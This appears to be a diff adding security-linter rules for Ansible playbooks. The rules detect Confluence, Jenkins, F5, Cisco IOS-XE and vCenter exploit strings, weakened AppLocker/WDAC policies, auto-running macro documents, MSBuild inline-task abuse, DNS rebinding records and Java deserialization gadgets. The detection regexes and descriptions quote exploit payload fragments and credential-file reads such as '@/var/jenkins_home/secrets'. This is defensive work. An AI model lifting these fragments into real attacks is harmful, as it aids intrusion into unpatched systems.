+    regex: "(?:Set-AppLockerPolicy[\\s\\S]{0,200}?(?:-Merge|-XmlPolicy\\s+[^\\s]*AllowAll)|Set-CIPolicy[\\s\\S]{0,500}?(?:-Rules\\s+[^\\s]*Allow|-Option\\s+(?:3|10))|ConvertFrom-CIPolicy[\\s\\S]{0,200}?(?:-Audit|-Deny\\s+false)|Set-RuleOption\\s+-(?:Option|FilePath)\\s+[^\\s]+\\s+(?:3|10)\\b|<Option>Enabled:Audit\\s+Mode</Option>|FileRule[\\s\\S]{0,200}?Level\\s*=\\s*['\"]?Hash['\"]?[\\s\\S]{0,200}?Hash\\s*=\\s*['\"]?\\*['\"]?)"
+    positive_examples:
+      - "Set-AppLockerPolicy-Merge"
+    multiline: true
+    window: 40
+    recommendation: "Never push WDAC/AppLocker policies from an ad-hoc playbook; roll them via Intune Endpoint Security or SCCM with a documented policy-review workflow. Keep WDAC in `Enforcement` mode (`Set-RuleOption -Option 0 -Delete` removes audit-mode flag). AppLocker rules MUST be built from publisher-signature (`New-AppLockerPolicy -RuleType Publisher`) or file-path allowlists - never hash wildcards. Monitor WDAC policy changes via Windows Event Log channel `Microsoft-Windows-CodeIntegrity/Operational` event IDs 3099 (policy applied) + 3089 (signature change) forwarded to SIEM with critical alerts on unexpected changes. Verify currently-active policy: `CiTool --list-policies | Where {$_.IsEffective}`."
+    no_ansible_remediation: true
+    cwe: ['CWE-284', 'CWE-693', 'CWE-732']
+    owasp_appsec: ["A01:2021"]
+    owasp_asvs: ["V12.4.1"]
+    mitre_attack: ['T1553.005', 'T1562.001', 'T1562.004']
+    cis_controls: ['CIS-2.1', 'CIS-2.4', 'CIS-4.8']
+    nist_controls: ['CM-7', 'SI-3', 'SI-7']
+    pci_dss: ['2.2.1', '5.2.1']
+    hipaa: ['164.308(a)(5)(ii)(B)']
+    soc2: ['CC6.1', 'CC7.1']
+
+  - id: "confluence_jenkins_cli_ognl_path_traversal_exploit_signature"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "Confluence OGNL / Jenkins CLI Path Traversal Exploit Payload Invoked From Playbook"
+    description: "A task's `uri`, `shell`, `command`, or `win_shell` invocation contains an exploit payload matching Confluence CVE-2023-22527 OGNL injection (`\\${new javax.script.ScriptEngineManager()`, `Runtime.getRuntime().exec(`, `freemarker.template.utility.Execute`), Jenkins CLI CVE-2024-23897 arg-at-file read (`@/etc/passwd`, `@/var/jenkins_home/secrets`), F5 BIG-IP iControl REST CVE-2022-1388 (`/mgmt/tm/util/bash`, `X-F5-Auth-Token: `), Cisco IOS-XE WebUI CVE-2023-20198 backdoor account creation (`/%25/NS/`, `username.*privilege 15`), or VMware vCenter CVE-2024-37080 DCERPC traversal. These are `uri:`/`shell:` invocations that only make sense as an active exploit - legitimate playbooks never contain these literal attack strings."
+    regex: "(?:uri|shell|command|win_shell|win_command|ansible\\.builtin\\.(?:uri|shell|command))[\\s\\S]{0,500}?(?:\\$\\{new\\s+javax\\.script\\.ScriptEngineManager|freemarker\\.template\\.utility\\.Execute|Runtime\\.getRuntime\\(\\)\\.exec\\(|jenkins-cli[\\s\\S]{0,200}?(?:@/etc/passwd|@/var/jenkins_home/secrets|@/var/lib/jenkins/secrets)|/mgmt/tm/util/bash[\\s\\S]{0,200}?X-F5-Auth-Token|/%25/NS/|/webui_wsma_HTTP|DCERPC[\\s\\S]{0,100}?vcsa|vmware-cip-launcher[\\s\\S]{0,100}?exec)"
+    positive_examples:
+      - "uri${new javax.script.ScriptEngineManager"
+    multiline: true
+    window: 15
+    recommendation: "Treat the host that runs the playbook AND the target host as compromised - this rule only fires on literal exploit strings. Isolate both, rotate all credentials the playbook had access to, and capture volatile memory via `avml` / `winpmem` before power-off. Patch the target per the CVE (Confluence ≥ 8.5.4 / 8.6.0 for CVE-2023-22527, Jenkins ≥ 2.442 / LTS 2.426.3 for CVE-2024-23897, F5 BIG-IP per K23605346, Cisco IOS-XE per cisco-sa-iosxe-webui-privesc-j22SaA4z, vCenter ≥ 8.0 U2c for CVE-2024-37080). Do NOT re-run the offending playbook. Hunt for persistence IoCs: Confluence -> `confluence-cli`/`webworks` plugin, Jenkins -> new `/var/jenkins_home/users/*/config.xml`, IOS-XE -> `cisco_support_user` account."
+    no_ansible_remediation: true
+    cwe: ['CWE-22', 'CWE-78', 'CWE-94']
+    cve: ["CVE-2022-1388", "CVE-2023-20198", "CVE-2023-22527", "CVE-2024-23897", "CVE-2024-37080"]
+    owasp_appsec: ["A01:2021", "A03:2021"]
+    owasp_asvs: ["V12.3.1", "V12.3.5"]
+    mitre_attack: ['T1059', 'T1190', 'T1210']
+    cis_controls: ['CIS-7.7', 'CIS-13.7', 'CIS-17.3']
+    nist_controls: ['IR-4', 'IR-6', 'SI-2', 'SI-3']
+    pci_dss: ['6.3.3', '11.3.1', '12.10.1']
+    hipaa: ['164.308(a)(6)(ii)']
+    soc2: ['CC7.1', 'CC7.2', 'CC7.4']
+
+  - id: "office_macro_docm_xlsm_with_autoopen_vba_pushed_via_copy"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "Office Macro-Enabled Document (.docm/.xlsm/.pptm) With AutoOpen/Workbook_Open VBA Pushed To Targets"
+    description: "A task uses `win_copy`, `copy`, `fetch`, `get_url`, or `ansible.builtin.copy` to transfer a macro-enabled Office document (`.docm`, `.xlsm`, `.pptm`, `.dotm`, `.xlsb` with `vbaProject.bin`, `.xll` Excel add-in) to user profile directories (`%APPDATA%`, `Desktop`, `Documents`, `Downloads`, `Startup`, `XLSTART`, Office Templates) OR explicitly references VBA auto-execution hooks (`AutoOpen`, `AutoExec`, `Workbook_Open`, `Document_Open`, `Auto_Close`, `Class_Initialize`). Office macros remain the #1 initial-access vector in 2024 Verizon DBIR (16% of all breaches with a known TTP). Even with Microsoft's 2022 'Macros blocked from the Internet by default' policy, macros in internally-transferred documents (via Ansible playbook) execute without the MotW block. Detection of AutoOpen/Workbook_Open specifically catches the fire-on-open pattern that turns a policy push into RCE. Distinct from lateral-movement rules (this is specifically malicious document delivery via automation)."
+    regex: "(?:win_copy|ansible\\.windows\\.win_copy|ansible\\.builtin\\.copy|copy|get_url)[\\s\\S]{0,500}?(?:src|url|dest)[\\s\\S]{0,300}?\\.(?:docm|xlsm|pptm|dotm|xlsb|xltm|pptm|xlam|xll)\\b|(?:dest|path)\\s*[:=]\\s*['\"]?[^'\"\\n]*?(?:AppData|Desktop|Documents|Startup|XLSTART|Templates|Documenti|Documentos)[^'\"\\n]*?\\.(?:docm|xlsm|pptm)|(?:Sub|Function)\\s+(?:AutoOpen|AutoExec|Workbook_Open|Document_Open|Auto_Close|Class_Initialize|Workbook_BeforeClose)\\s*\\(|VBA\\.(?:CreateObject|Shell|Run)[\\s\\S]{0,200}?(?:WScript\\.Shell|powershell|cmd\\.exe)|\\.dotm.*Startup|xlStart.*\\.xl[asm]"
+    positive_examples:
+      - "win_copysrc.docm"
+    multiline: true
+    window: 12
+    recommendation: "Do NOT distribute macro-enabled Office documents via Ansible for any production workflow. Block macro execution organization-wide via Group Policy: `Computer Config -> Admin Templates -> Microsoft Office 2016 -> Security -> Block macros from running in Office files from the Internet = Enabled` + `VBA Macro Notification Settings = Disable all without notification`. For legitimate macro use (finance teams, engineering calc sheets), require **code-signed macros only** with a digital signature from an internal CA trusted in the user's cert store. Convert existing macros to Office Scripts (cloud-backed, signed, sandboxed, no VBA). Quarantine macro-enabled files at email gateway. If a playbook MUST deliver templates, deliver the non-macro variant (`.docx`, `.xlsx`). Detect: Sysmon Event ID 1 for `WINWORD.EXE`/`EXCEL.EXE` with child process (`cmd.exe`, `powershell.exe`, `wscript.exe`) - this combination is >99% malicious. Alert on any Ansible task transferring `.docm`/`.xlsm`/`.pptm` to user-writable paths."
+    no_ansible_remediation: true
+    cwe: ['CWE-94', 'CWE-506', 'CWE-829']
+    owasp_appsec: ["A03:2021", "A08:2021"]
+    owasp_asvs: ["V10.3.1"]
+    mitre_attack: ['T1059.005', 'T1137.001', 'T1204.002']
+    cis_controls: ['CIS-9.6', 'CIS-10.2', 'CIS-10.7']
+    nist_controls: ['CM-7', 'SI-3', 'SI-3(8)']
+    pci_dss: ['5.2.1', '6.3.3']
+    hipaa: ['164.308(a)(5)(ii)(B)']
+    soc2: ['CC7.1', 'CC7.2']
+
+  - id: "msbuild_inline_task_lolbin_execution"
+    category: "malicious_activity"
+    severity: "HIGH"
+    title: "MSBuild Inline-Task XML (.csproj/.xml) Executed As LOLBIN For Unsigned Code Execution"
+    description: "A task creates a `.csproj`, `.xml`, `.proj`, or `.targets` file containing an `<UsingTask>` with inline `Code Type=\"Class\"` / `Code Type=\"Fragment\"` containing C# source, then invokes `MSBuild.exe <file>` / `msbuild /t:<target>` - OR the task uses `powershell` to execute MSBuild against a payload. MSBuild is a Microsoft-signed Windows binary (`%WINDIR%\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe`) present on EVERY Windows host since .NET 4, so it bypasses AppLocker 'signed executables only' policies, bypasses Constrained Language Mode (runs C# not PowerShell), and its build output looks legitimate in EDR telemetry. Cobalt Strike, Brute Ratel, and Nighthawk all ship MSBuild inline-task templates for exactly this reason. 2024 Red Canary Threat Report lists `msbuild.exe` as #4 most-abused LOLBIN."
+    regex: "<UsingTask\\b[^>]*TaskName[\\s\\S]{0,500}?<Code\\s+Type\\s*=\\s*['\"]?(?:Class|Fragment)['\"]?|<Task\\b[\\s\\S]{0,600}?<Code\\s+Type\\s*=\\s*['\"]?(?:Class|Fragment)['\"]?|(?:msbuild|MSBuild)(?:\\.exe)?\\s+[^\\n]*?(?:\\.(?:csproj|xml|proj|targets))\\b[\\s\\S]{0,200}?(?:/t:|/target:|/p:)|msbuild\\.exe\\s+[^\\n]*?\\\\Users\\\\[^\\s]+\\\\(?:AppData|Temp|Downloads)|(?:win_shell|ansible\\.windows\\.win_shell|win_command|ansible\\.windows\\.win_command)[\\s\\S]{0,400}?msbuild[\\s\\S]{0,100}?(?:\\.csproj|\\.xml|\\.proj|\\.targets)"
+    positive_examples:
+      - "<UsingTask TaskName <Code Type =  Class "
+    multiline: true
+    window: 15
+    recommendation: "Block `MSBuild.exe` with AppLocker or Microsoft Defender Application Control (WDAC) on hosts that do NOT legitimately compile .NET code (i.e. everything except developer workstations and build servers). Use WDAC's `--Block-MSBuild-Code-Execution` supplemental policy from Microsoft's recommended-block-list. On dev hosts where MSBuild IS legitimate, alert on MSBuild invocations with `.csproj` / `.xml` paths under user profile directories (`AppData`, `Temp`, `Downloads`, `Desktop`) - legitimate dev work uses source-controlled repos, NEVER from those paths. Detect: Sysmon Event ID 1 with `Image=*\\msbuild.exe` + `CommandLine` matching user-profile paths. For Ansible automation that needs compilation, use a dedicated build agent in a locked-down network segment with limited egress - not 'msbuild.exe from a user laptop playbook'. Audit: `Get-EventLog -LogName Application -Source 'MSBuild' -After (Get-Date).AddDays(-7)` - any entry on a non-dev host is suspicious."
+    no_ansible_remediation: true
+    cwe: ['CWE-94', 'CWE-506', 'CWE-829']
+    owasp_appsec: ["A03:2021", "A08:2021"]
+    owasp_asvs: ["V10.3.1"]
+    mitre_attack: ['T1059.005', 'T1127.001', 'T1218']
+    cis_controls: ['CIS-2.7', 'CIS-10.5', 'CIS-10.7']
+    nist_controls: ['CM-7', 'SI-3', 'SI-7']
+    pci_dss: ['5.2.1', '6.3.3']
+    hipaa: ['164.308(a)(5)(ii)(B)']
+    soc2: ['CC7.1', 'CC7.2']
+
+  - id: "dns_rebinding_record_with_public_and_rfc1918_targets"
+    category: "malicious_activity"
+    severity: "HIGH"
+    title: "DNS Rebinding Record - Same Name Resolves To Public IP + RFC1918/Localhost IP (SSRF Primitive)"
+    description: "A task renders DNS zone content (`nsupdate`, `route53`, `cloudflare_dns_record`, `bind` zone file, `dnsmasq.conf`, `hosts` file entry) where a SINGLE hostname has multiple `A` records mixing a public IP (1.2.3.4) with an internal (10.x, 172.16-31.x, 192.168.x), loopback (127.x), link-local (169.254.x), or metadata (169.254.169.254) IP. Also catches low-TTL records (`TTL: 0` / `TTL: 1`) typical of rebinding attacks. Modern `dns-rebind-toolkit` / `rebind.network` / `singularity` attacks: attacker-controlled DNS server returns public IP for first query (user's browser loads attacker JS), then returns internal IP for subsequent queries from the same page (browser's same-origin policy is DNS-name-based, not IP-based) -> attacker JS now talks to victim's internal network as if same-origin. Catches both malicious config AND accidentally-vulnerable DNS patterns from split-horizon bugs."
+    regex: "(?:^|\\n)\\s*(\\S+)\\s+(?:\\d+\\s+)?(?:IN\\s+)?A\\s+(?:(?:127\\.\\d+\\.\\d+\\.\\d+|169\\.254\\.\\d+\\.\\d+|10\\.\\d+\\.\\d+\\.\\d+|172\\.(?:1[6-9]|2\\d|3[01])\\.\\d+\\.\\d+|192\\.168\\.\\d+\\.\\d+))[\\s\\S]{0,300}?^\\s*\\1\\s+(?:\\d+\\s+)?(?:IN\\s+)?A\\s+(?!(?:127|169\\.254|10|172\\.(?:1[6-9]|2\\d|3[01])|192\\.168))\\d+\\.\\d+\\.\\d+\\.\\d+|(?:cloudflare_dns_record|route53_record|amazon\\.aws\\.route53|community\\.general\\.cloudflare_dns|bind_zone|nsupdate)[\\s\\S]{0,600}?(?:ttl\\s*[:= ]\\s*['\"]?(?:0|1|2|3|60)['\"]?)[\\s\\S]{0,400}?(?:value|address|content)\\s*[:= ]\\s*['\"]?(?:127\\.|169\\.254\\.|10\\.|172\\.(?:1[6-9]|2\\d|3[01])\\.|192\\.168\\.)"
+    positive_examples:
+      - |2-
+        amazon.aws.route53:
+                state: absent
+                zone: "{{ zone_one }}"
+                record: latency-test.{{ zone_one }}
+                identifier: latencyhost@www
+                type: A
+                value: 127.0.0.1
+                ttl: 30
+                routing_region: us-east-1
+              ignore_errors: true
+
+            - name: Delete a record with geo_location - continent_code
+              amazon.aws.route53:
+                state: absent
+                zone: "{{ zone_one }}"
+                record: geo-test-1.{{ zone_one }}
+                identifier: geohost1@www
+                type: A
+                value: 127.
+    multiline: true
+    window: 30
+    recommendation: "Never map a single public-facing hostname to both a public AND an RFC1918/loopback/link-local IP. For legitimate split-horizon DNS (internal-users-see-internal, external-see-external), use **views** (BIND), **policies** (PowerDNS), or **split DNS** - NOT multiple A records in the same view. Set TTLs to sane values (300-3600s); TTLs of 0/1/2 are almost always malicious or operationally broken. Configure recursive resolvers to reject responses containing private-space IPs for public-space hostnames - BIND `deny-answer-addresses { 10.0.0.0/8; 172.16.0.0/12; 192.168.0.0/16; 127.0.0.0/8; 169.254.0.0/16; } except-from { internal-domains; };`. Browser-side: use DNS-over-HTTPS (DoH) to bypass attacker-controlled local resolvers. Application-side: validate the resolved IP AFTER DNS resolution and before HTTP request (`socket.getaddrinfo` + IP-range check) - reject private IPs when you expect a public endpoint. Detect: passive DNS / Zeek scripts alerting on any hostname resolving to a mix of public + RFC1918 within a 1-hour window."
+    no_ansible_remediation: true
+    cwe: ['CWE-290', 'CWE-346', 'CWE-918']
+    owasp_appsec: ["A07:2021", "A10:2021"]
+    mitre_attack: ['T1071.004', 'T1090', 'T1557']
+    cis_controls: ['CIS-9.2', 'CIS-9.4', 'CIS-13.10']
+    nist_controls: ['SC-20', 'SC-21', 'SC-22']
+    pci_dss: ['1.4.2', '6.3.3']
+    hipaa: ['164.312(e)(1)']
+    soc2: ['CC6.6', 'CC7.1']
+
+  - id: "java_deserialization_ysoserial_or_commons_collections_gadget"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "Java Deserialization Gadget Chain (ysoserial / commons-collections InvokerTransformer) In Playbook / File"
+    description: "A task writes or transfers a file or string containing Java-deserialization gadget-chain signatures: the literal token `ysoserial` / `ysoserial-modified`, the `aced0005` magic header of Java's `ObjectOutputStream` format (hex-encoded serialized object), or the classic `commons-collections` gadget-chain classes (`InvokerTransformer`, `ChainedTransformer`, `InstantiateTransformer`, `TrAXFilter`, `PriorityQueue` + `Comparator`, `LazyMap`, `TransformingComparator`). These are the confirmed building blocks of every widely-used Java-deser RCE from 2015 (CVE-2015-4852 WebLogic) through 2024 (Spring, ActiveMQ, Jackson, Confluence, OpenNMS). An Ansible playbook shipping a `.ser` / `.bin` file with this content is either delivering a weaponized payload or configuring a honeypot. Distinct from the 'log4shell' rules (that's JNDI lookup, this is classic Java deser)."
+    regex: "\\bysoserial(?:-modified|-plus|-classpath)?\\b|\\baced0005[0-9a-f]{8,}|(?:InvokerTransformer|ChainedTransformer|InstantiateTransformer|TransformingComparator|TrAXFilter|LazyMap\\s*\\.|PriorityQueue\\b[\\s\\S]{0,200}?Comparator)\\b[\\s\\S]{0,200}?(?:newTransformer|Runtime\\.getRuntime|ProcessBuilder|exec\\s*\\(|Method\\.invoke)|(?:rO0AB|AAAAAQ|AAEAAAE|rO0ABXNyAB)[A-Za-z0-9+/=]{40,}|org\\.apache\\.commons\\.collections\\.functors\\.(?:InvokerTransformer|ChainedTransformer|InstantiateTransformer)"
+    positive_examples:
+      - "ysoserial"
+    multiline: true
+    window: 10
+    recommendation: "Never transfer serialized Java objects from untrusted or unverified sources. If your application legitimately uses Java deserialization (migrate away from it - JSON or Protobuf are safer), configure **SerialKiller** (`org.nibblesec.tools.SerialKiller`) as the `ObjectInputFilter` to allow-list only specific classes. For Java 9+, use `ObjectInputFilter.Config.setSerialFilter(\"!org.apache.commons.collections.functors.*;!javax.management.BadAttributeValueExpException;...\")` on every JVM startup. Block `commons-collections` < 3.2.2 and < 4.1 (both have InvokerTransformer exposed) via Maven enforcer / Gradle dependency constraints. For runtime, enable RASP (Contrast, OpenRASP) to block deserialization call stacks that terminate in `Runtime.exec` / `ProcessBuilder`. Audit: `find / -name '*.ser' -exec xxd {} + | head -1 | grep -q 'aced 0005' && echo SUSPECT` + grep codebases for `ObjectInputStream` constructor calls without a preceding `setObjectInputFilter`. Migrate high-risk deserialization to Jackson with `ACCEPT_CASE_INSENSITIVE_PROPERTIES=false` + `@JsonTypeInfo(use = NAME)` explicit class whitelisting only."
+    no_ansible_remediation: true
+    cwe: ['CWE-94', 'CWE-502', 'CWE-915']
+    cve: ["CVE-2015-4852"]
+    owasp_appsec: ["A03:2021", "A08:2021"]
+    owasp_asvs: ["V10.2.1"]
+    mitre_attack: ['T1059', 'T1190', 'T1203']
+    cis_controls: ['CIS-10.5', 'CIS-16.1', 'CIS-16.11']
+    nist_controls: ['SA-11', 'SI-3', 'SI-10']
+    pci_dss: ['6.2.4', '6.3.3', '11.3.1']
+    hipaa: ['164.308(a)(5)(ii)(B)', '164.312(c)(1)']
+    soc2: ['CC7.1', 'CC7.2']
